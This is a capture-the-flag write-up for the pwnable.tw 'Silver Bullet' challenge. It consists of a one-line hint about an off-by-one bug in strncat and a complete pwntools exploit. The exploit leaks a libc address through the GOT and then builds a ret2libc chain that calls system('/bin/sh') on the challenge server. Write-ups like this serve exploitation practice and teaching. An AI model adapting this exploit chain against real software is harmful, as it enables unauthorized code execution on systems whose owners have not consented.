# Silver Bullet
> LongChampion, 26/03/2020

## Hint
Look at function `strncat` in `power_up` procedure, there is an `off by one` vulnerable.

## Final Solution
```python
#!/usr/bin/env python2

from pwn import *

puts_plt = 0x080484a8
usleep_got = 0x0804afd8
main_addr = 0x08048954
payload1 = p32(puts_plt) + p32(main_addr) + p32(usleep_got)


def PWN_PROCESS(r, payload):
    r.sendlineafter("Your choice", "1")
    r.sendlineafter("Give me your description of bullet", " " * 47)
    r.sendlineafter("Your choice", "2")
    r.sendlineafter("Give me your another description of bullet", " ")
    r.sendlineafter("Your choice", "2")
    r.sendlineafter("Give me your another description of bullet",
                    "\xff" * 7 + payload)
    r.sendlineafter("Your choice", "3")
    r.recvuntil("Oh ! You win !!\n")


r = remote("chall.pwnable.tw", 10103)
LIBC = ELF("./libc_32.so.6")

PWN_PROCESS(r, payload1)

usleep_addr = u32(r.recv(4))
LIBC_BASE = usleep_addr - LIBC.symbols["usleep"]
system_addr = LIBC_BASE + LIBC.symbols["system"]
binsh_addr = LIBC_BASE + LIBC.search("/bin/sh\x00").next()
payload2 = p32(system_addr) + p32(main_addr) + p32(binsh_addr)

PWN_PROCESS(r, payload2)

r.interactive()
```
